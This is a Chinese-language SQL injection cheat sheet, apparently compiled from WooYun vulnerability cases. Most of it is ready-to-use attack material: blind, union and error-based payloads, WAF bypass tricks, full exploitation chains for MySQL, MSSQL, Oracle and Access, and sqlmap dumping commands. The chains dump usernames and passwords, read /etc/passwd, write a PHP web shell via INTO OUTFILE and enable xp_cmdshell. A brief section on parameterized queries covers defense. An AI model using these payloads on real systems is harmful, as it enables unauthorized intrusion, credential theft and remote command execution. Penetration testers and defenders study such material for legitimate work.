# Web 安全 - SQL 注入

> 来源: WooYun 漏洞库（27,732 SQL 注入案例）| 拆自 web-injection.md

## 一、SQL注入

### 1.1 漏洞本质

```
输入验证缺失 → 动态SQL拼接 → 语义边界突破 → 数据库指令执行
```

**核心公式**：SQL注入 = 代码与数据边界混淆 + 用户输入提升为可执行SQL指令

### 1.2 检测方法

#### 高危注入点识别

| 向量类型 | 占比 | 典型场景 |
|---------|------|---------|
| 登录框 | 66% | 用户名/密码直接拼接 |
| 搜索框 | 64% | LIKE语句模糊匹配 |
| POST参数 | 60% | 表单提交 |
| HTTP头 | 26% | UA/Referer/XFF |
| GET参数 | 24% | URL参数 |
| Cookie | 12% | 会话标识处理 |

**高频参数名**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NET特有：`__viewstate`, `__eventvalidation`

#### 快速检测流程

```
1. 单引号/双引号测试 → 观察报错
2. 数学运算: id=2-1 / id=1*1 → 观察等价性
3. 布尔测试: and 1=1 / and 1=2 → 对比响应差异
4. 时间延迟: and sleep(5) → 观察响应时间
5. 排序探列: order by N → 递增至报错
```

#### 数据库指纹识别

| 数据库 | 延迟函数 | 系统表 | 错误特征 |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | 笛卡尔积延迟 | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 注入技术与Payload

#### 布尔盲注

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### 时间盲注

```sql
-- MySQL（嵌套延迟实战技巧）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### 联合查询

```sql
id=1 ORDER BY N--              -- 探列数
id=-1 UNION SELECT 1,2,3,4,5--  -- 确定回显位
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### 报错注入

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHAR函数绕过字符过滤
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/过滤绕过技巧

#### 内联注释（最常用）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS绕过实例
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### 编码绕过

```sql
-- 十六进制: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL双重编码: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### 大小写 + 空白符替换

```sql
UnIoN SeLeCt                    -- 大小写混淆
UNION/**/SELECT/**/1,2,3        -- 注释替代空格
UNION%09SELECT                  -- Tab替代
UNION%0ASELECT                  -- 换行替代
```

#### 函数替代

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> 字符A
```

#### 逻辑等价替换

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- 引号绕过
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### 宽字节注入（GBK编码）

```
%bf%27 绕过 addslashes()   -- GBK下多字节字符吞掉反斜杠
```

#### HTTP层绕过

```
参数污染: id=1&id=2             -- 重复参数混淆
分块传输: Transfer-Encoding: chunked
X-Forwarded-For注入 / Cookie注入  -- 非常规注入点
```

### 1.5 利用链

#### MySQL完整利用链

```sql
-- 1.信息 -> 2.库 -> 3.表 -> 4.列 -> 5.数据 -> 6.文件 -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL完整利用链

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- 命令执行（需sa权限）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle利用链

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access盲注利用链

```sql
-- 无information_schema，需获取源码或猜表名
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- 多用户枚举用NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 防御措施

```python
# 参数化查询（首选）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- 参数化查询/预编译语句（首选）、存储过程（次选）
- 白名单输入验证 + 数字型参数强制类型转换
- 数据库最小权限 + 错误信息隐藏 + WAF部署

---


---

## 附录：SQLMap速查

```bash
# 基础检测
sqlmap -u "http://t/p.php?id=1" --batch
# POST请求
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTP头注入
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# 绕过WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# 数据提取链
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
